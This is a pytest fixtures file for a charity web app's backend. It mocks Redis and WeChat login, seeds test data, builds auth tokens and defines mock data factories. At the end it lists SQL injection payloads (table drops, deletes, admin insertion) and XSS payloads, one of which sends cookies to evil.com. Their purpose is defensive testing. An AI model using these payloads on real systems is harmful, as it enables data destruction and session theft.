"""
Shared test fixtures for Tonghua Public Welfare test suite.
Provides test database, auth helpers, and mock data factories.
"""

import os
import sys
import uuid
from datetime import datetime, timedelta, timezone
from typing import AsyncGenerator, Optional

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient
from unittest.mock import AsyncMock, patch

# Patch redis for testing (avoid Redis connection errors)
# This must be done before importing any backend modules that use redis
redis_mock = AsyncMock()
# Track voted keys for duplicate vote detection
_voted_keys = set()

async def mock_exists(key):
    """Mock exists - returns True if key was voted."""
    return key in _voted_keys

async def mock_setex(key, ttl, value):
    """Mock setex - marks key as voted."""
    _voted_keys.add(key)
    return True

# Configure default behavior for Redis methods used in the app
redis_mock.exists = mock_exists
redis_mock.setex = mock_setex
# incr should increment (for rate limiting)
redis_mock.incr = AsyncMock(side_effect=lambda key: 1) # First call returns 1
redis_mock.expire = AsyncMock(return_value=True)

redis_patch = patch('redis.asyncio.from_url', return_value=redis_mock)
redis_patch.start()

# Mock WeChat API calls for login
# Patch at the instance level to avoid method binding issues
original_async_get = AsyncClient.get

async def mock_wechat_get(self, url, **kwargs):
    # Check if this is a WeChat API call
    if isinstance(url, str) and "api.weixin.qq.com" in url:
        # Return a mock response object
        mock_resp = AsyncMock()
        mock_resp.status_code = 200

        # Check URL for invalid code
        if "invalid_code" in url:
            mock_resp.json = lambda: {
                "errcode": 40029,
                "errmsg": "invalid code"
            }
        else:
            mock_resp.json = lambda: {
                "openid": "test_openid_12345",
                "session_key": "test_session_key_67890",
                "unionid": "test_unionid_12345"
            }
        return mock_resp

    # For non-WeChat requests, use the original method
    # Note: We can't directly call original_async_get because it's unbound
    # So we need to use the original implementation path
    # https://www.python.org/dev/peps/pep-0562/ - we can't get the original bound method easily
    # Instead, we'll call the original unbound function with proper self
    return await original_async_get(self, url, **kwargs)

httpx_patch = patch.object(AsyncClient, 'get', new=mock_wechat_get)
httpx_patch.start()

# Add the backend package root to Python path so `import app...` works
# no matter whether pytest is launched from repo root or from `backend/`.
tests_dir = os.path.abspath(os.path.dirname(__file__))
backend_dir = os.path.abspath(os.path.join(tests_dir, ".."))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

test_db_path = os.path.join(backend_dir, "test.db")

# Set required environment variables for testing
# These are required by app.config.Settings
os.environ.setdefault("TESTING", "1")
os.environ.setdefault("DATABASE_URL", f"sqlite+aiosqlite:///{test_db_path}")
os.environ.setdefault("REDIS_URL", "redis://localhost:6379")
os.environ.setdefault("APP_SECRET_KEY", "test-secret-key-for-hmac-sha256")
os.environ.setdefault("ENCRYPTION_KEY", "test-encryption-key-32-bytes-long!!!")
os.environ.setdefault("SEED_ADMIN_PASSWORD", "adminpass")
os.environ.setdefault("SEED_EDITOR_PASSWORD", "editorpass")
os.environ.setdefault("SEED_USER_PASSWORD", "userpass")
# Use HS256 for testing (simpler than RS256)
os.environ.setdefault("JWT_ALGORITHM", "HS256")

# CORS configuration (required for TrustedHostMiddleware)
os.environ.setdefault("CORS_ORIGINS", '["http://localhost:3000", "http://test", "http://testserver"]')

# WeChat Pay configuration (required for payment_service singleton)
os.environ.setdefault("WECHAT_APP_ID", "test-app-id")
os.environ.setdefault("WECHAT_APP_SECRET", "test-app-secret")
os.environ.setdefault("WECHAT_MCH_ID", "test-mch-id")
os.environ.setdefault("WECHAT_PAY_API_KEY", "test-api-key")
os.environ.setdefault("WECHAT_NOTIFY_URL", "http://localhost:8000/api/v1/payments/wechat-notify")

# ---------------------------------------------------------------------------
# Database fixtures
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture(scope="session")
async def test_db():
    """
    Set up a SQLite test database.
    In a real project, this would create tables via Alembic or SQLAlchemy.
    We mock the database layer for isolated API-level testing.
    """
    # Placeholder: in production, create SQLite engine and run migrations
    # engine = create_async_engine("sqlite+aiosqlite:///test_tonghua.db")
    # async with engine.begin() as conn:
    #     await conn.run_sync(Base.metadata.create_all)
    yield None
    # async with engine.begin() as conn:
    #     await conn.run_sync(Base.metadata.drop_all)


# ---------------------------------------------------------------------------
# Application fixture
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture(scope="session")
async def app():
    """
    Create the FastAPI application for testing.
    Imports the app from the backend module.
    """
    if os.path.exists(test_db_path):
        os.remove(test_db_path)

    try:
        # Since backend_dir is in sys.path, app is the top-level package
        from app.main import app as application
        # Debug: print routes (only once)
        if not hasattr(app, '_printed_routes'):
            print("\nDEBUG: Registered routes:")
            for route in application.routes:
                if hasattr(route, "path"):
                    print(f"  {route.methods if hasattr(route, 'methods') else 'N/A'} {route.path}")
            app._printed_routes = True

    except ImportError as e:
        # Fallback: create a minimal FastAPI app for testing
        print(f"Warning: Could not import backend app: {e}")
        from fastapi import FastAPI
        application = FastAPI(title="Tonghua Test API")

    # Seed the database with a test user for authentication tests
    try:
        from app.database import engine, Base, AsyncSessionLocal
        from app.models.user import User
        from app.security import hash_password
        from sqlalchemy import select

        # Create a fresh schema for the session.
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

        async with AsyncSessionLocal() as db:
            # Seed a campaign first to avoid FK constraint violation during artwork creation
            from app.models.campaign import Campaign
            from app.models.donation import Donation
            from datetime import datetime, timezone, timedelta
            stmt_campaign = select(Campaign).where(Campaign.id == 1)
            result_campaign = await db.execute(stmt_campaign)
            campaign = result_campaign.scalar_one_or_none()
            if not campaign:
                campaign = Campaign(
                    id=1,
                    title="Test Campaign",
                    description="Test campaign for artworks",
                    cover_image="https://example.com/test.jpg",
                    start_date=datetime.now(timezone.utc),
                    end_date=datetime.now(timezone.utc) + timedelta(days=30),
                    goal_amount=10000.00,
                    current_amount=0.00,
                    status="active",
                )
                db.add(campaign)
                await db.commit()
                print("Test campaign seeded successfully.")

            # Seed a completed donation for ID 1 (required by TestDonationCertificate)
            stmt_donation = select(Donation).where(Donation.id == 1)
            result_donation = await db.execute(stmt_donation)
            donation = result_donation.scalar_one_or_none()
            if not donation:
                donation = Donation(
                    id=1,
                    donor_name="Test Donor",
                    donor_user_id=1,
                    amount=100.00,
                    currency="CNY",
                    payment_method="stripe",
                    payment_id="mock_1",
                    campaign_id=1,
                    status="completed",
                    is_anonymous=False,
                    message="Test donation",
                )
                db.add(donation)
                await db.commit()
                print("Test donation seeded successfully.")

            stmt = select(User).where(User.email == "user@example.com")
            result = await db.execute(stmt)
            user = result.scalar_one_or_none()
            if not user:
                user = User(
                    email="user@example.com",
                    password_hash=hash_password("secure_password_123"),
                    nickname="Test User",
                    role="user",
                    status="active",
                )
                db.add(user)
                await db.commit()
                print("Test user seeded successfully.")
    except Exception as e:
        print(f"Warning: Could not seed test user: {e}")

    return application


@pytest_asyncio.fixture
async def client(app) -> AsyncGenerator[AsyncClient, None]:
    """Create an async HTTP test client."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        yield ac


# ---------------------------------------------------------------------------
# Auth token helpers
# ---------------------------------------------------------------------------

# We need to import security functions here, but they depend on settings
# which is loaded when app.config is imported.
# We'll defer import until the fixture is called.

@pytest_asyncio.fixture(scope="session")
def valid_token():
    """Generate a valid access token for test user (ID 1)."""
    from app.security import create_access_token
    # Using subject "1" as we seeded the user and expect it to be ID 1
    return create_access_token(subject="1", role="user")

@pytest_asyncio.fixture(scope="session")
def valid_refresh_token():
    """Generate a valid refresh token for test user (ID 1)."""
    from app.security import create_refresh_token
    return create_refresh_token(subject="1")

@pytest_asyncio.fixture
def auth_headers(valid_token):
    """Return authorization headers with a valid test token."""
    return {
        "Authorization": f"Bearer {valid_token}",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def expired_auth_headers():
    """Return authorization headers with an expired token."""
    # Generate an expired token for testing
    from app.security import create_access_token
    from datetime import timedelta
    import time

    # Create a token that expired 1 hour ago
    from app.config import settings
    from jose import jwt
    from datetime import datetime, timezone

    payload = {
        "sub": "1",
        "role": "user",
        "type": "access",
        "iat": datetime.now(timezone.utc) - timedelta(hours=2),
        "exp": datetime.now(timezone.utc) - timedelta(hours=1),
    }

    if settings.JWT_ALGORITHM == "HS256":
        signing_key = settings.APP_SECRET_KEY
    else:
        signing_key = settings.JWT_PRIVATE_KEY

    expired_token = jwt.encode(payload, signing_key, algorithm=settings.JWT_ALGORITHM)

    return {
        "Authorization": f"Bearer {expired_token}",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def admin_auth_headers():
    """Return authorization headers for an admin user."""
    from app.security import create_access_token
    token = create_access_token(subject="admin-1", role="super_admin")
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def guardian_auth_headers():
    """Return authorization headers for a guardian user."""
    from app.security import create_access_token
    token = create_access_token(subject="guardian-1", role="guardian")
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def no_auth_headers():
    """Headers without authorization."""
    return {"Content-Type": "application/json"}


# ---------------------------------------------------------------------------
# Mock data factories
# ---------------------------------------------------------------------------

def generate_uuid() -> str:
    """Generate a deterministic-looking UUID for tests."""
    return str(uuid.uuid4())


class MockUserFactory:
    """Factory for creating test user data."""

    @staticmethod
    def create(
        user_id: Optional[str] = None,
        email: str = "test@example.com",
        display_name: str = "Test User",
        role: str = "registered",
        is_active: bool = True,
    ) -> dict:
        return {
            "id": user_id or generate_uuid(),
            "email": email,
            "display_name": display_name,
            "role": role,
            "is_active": is_active,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }

    @staticmethod
    def guardian(user_id: Optional[str] = None) -> dict:
        return MockUserFactory.create(
            user_id=user_id,
            email="guardian@example.com",
            display_name="Guardian User",
            role="guardian",
        )

    @staticmethod
    def admin(user_id: Optional[str] = None) -> dict:
        return MockUserFactory.create(
            user_id=user_id,
            email="admin@tonghua.org",
            display_name="Admin User",
            role="super_admin",
        )

    @staticmethod
    def child_participant(user_id: Optional[str] = None) -> dict:
        return MockUserFactory.create(
            user_id=user_id,
            email="child@example.com",
            display_name="Little Star",
            role="child_participant",
        )


class MockArtworkFactory:
    """Factory for creating test artwork data."""

    @staticmethod
    def create(
        artwork_id: Optional[str] = None,
        title: str = "My Rainbow World",
        campaign_id: Optional[str] = None,
        status: str = "approved",
        vote_count: int = 42,
    ) -> dict:
        return {
            "id": artwork_id or generate_uuid(),
            "title": title,
            "image_url": f"https://cdn.tonghua.org/artworks/{artwork_id or 'test'}.jpg",
            "thumbnail_url": f"https://cdn.tonghua.org/artworks/{artwork_id or 'test'}_thumb.jpg",
            "display_name": "Little Star",
            "campaign_id": campaign_id or generate_uuid(),
            "campaign_title": "Colors of Hope",
            "vote_count": vote_count,
            "status": status,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }


class MockCampaignFactory:
    """Factory for creating test campaign data."""

    @staticmethod
    def create(
        campaign_id: Optional[str] = None,
        title: str = "Colors of Hope",
        status: str = "active",
    ) -> dict:
        now = datetime.now(timezone.utc)
        return {
            "id": campaign_id or generate_uuid(),
            "title": title,
            "theme": "Paint your hopes for the future",
            "description": "A campaign celebrating children's creativity",
            "cover_image_url": "https://cdn.tonghua.org/campaigns/test.jpg",
            "start_date": (now - timedelta(days=30)).strftime("%Y-%m-%d"),
            "end_date": (now + timedelta(days=60)).strftime("%Y-%m-%d"),
            "status": status,
            "max_artworks": 500,
            "artwork_count": 156,
            "vote_enabled": True,
        }


class MockDonationFactory:
    """Factory for creating test donation data."""

    @staticmethod
    def create(
        donation_id: Optional[str] = None,
        amount: float = 100.00,
        status: str = "completed",
        user_id: Optional[str] = None,
    ) -> dict:
        return {
            "id": donation_id or generate_uuid(),
            "user_id": user_id or generate_uuid(),
            "amount": amount,
            "currency": "CNY",
            "status": status,
            "message": "For the children!",
            "is_anonymous": False,
            "donor_name": "Jane D.",
            "created_at": datetime.now(timezone.utc).isoformat(),
        }


class MockProductFactory:
    """Factory for creating test product data."""

    @staticmethod
    def create(
        product_id: Optional[str] = None,
        title: str = "Rainbow Tote Bag",
        price: float = 128.00,
        category: str = "bags",
    ) -> dict:
        return {
            "id": product_id or generate_uuid(),
            "title": title,
            "description": "Handcrafted from organic cotton with natural dyes",
            "price": price,
            "materials": "100% organic cotton, natural dyes",
            "sustainability_info": "GOTS certified, carbon neutral shipping",
            "welfare_contribution": 15.00,
            "image_urls": [
                f"https://cdn.tonghua.org/products/{product_id or 'test'}_1.jpg",
                f"https://cdn.tonghua.org/products/{product_id or 'test'}_2.jpg",
            ],
            "category": category,
            "stock": 45,
            "is_active": True,
        }


class MockOrderFactory:
    """Factory for creating test order data."""

    @staticmethod
    def create(
        order_id: Optional[str] = None,
        user_id: Optional[str] = None,
        product_id: Optional[str] = None,
        status: str = "pending_payment",
    ) -> dict:
        return {
            "id": order_id or generate_uuid(),
            "user_id": user_id or generate_uuid(),
            "product_id": product_id or generate_uuid(),
            "quantity": 2,
            "unit_price": 128.00,
            "total_amount": 256.00,
            "status": status,
            "shipping_address": {
                "name": "Jane Doe",
                "phone": "+86-138-0000-0000",
                "province": "Guangdong",
                "city": "Shenzhen",
                "district": "Nanshan",
                "address": "123 Tech Park Road",
                "postal_code": "518000",
            },
            "created_at": datetime.now(timezone.utc).isoformat(),
        }


# ---------------------------------------------------------------------------
# Fixture instances of factories
# ---------------------------------------------------------------------------

@pytest.fixture
def mock_user_factory():
    return MockUserFactory


@pytest.fixture
def mock_artwork_factory():
    return MockArtworkFactory


@pytest.fixture
def mock_campaign_factory():
    return MockCampaignFactory


@pytest.fixture
def mock_donation_factory():
    return MockDonationFactory


@pytest.fixture
def mock_product_factory():
    return MockProductFactory


@pytest.fixture
def mock_order_factory():
    return MockOrderFactory


# ---------------------------------------------------------------------------
# SQL injection payloads
# ---------------------------------------------------------------------------

@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection test payloads."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM artworks WHERE 1=1 --",
        "' OR 1=1 --",
        "admin'--",
        "1' AND '1'='1",
        "' UNION SELECT null,null,null --",
        "'; INSERT INTO users (role) VALUES ('super_admin'); --",
    ]


# ---------------------------------------------------------------------------
# XSS payloads
# ---------------------------------------------------------------------------

@pytest.fixture
def xss_payloads():
    """Common XSS test payloads."""
    return [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(document.cookie)',
        '<svg onload=alert(1)>',
        '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        "<iframe src='javascript:alert(1)'>",
        '<body onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
    ]
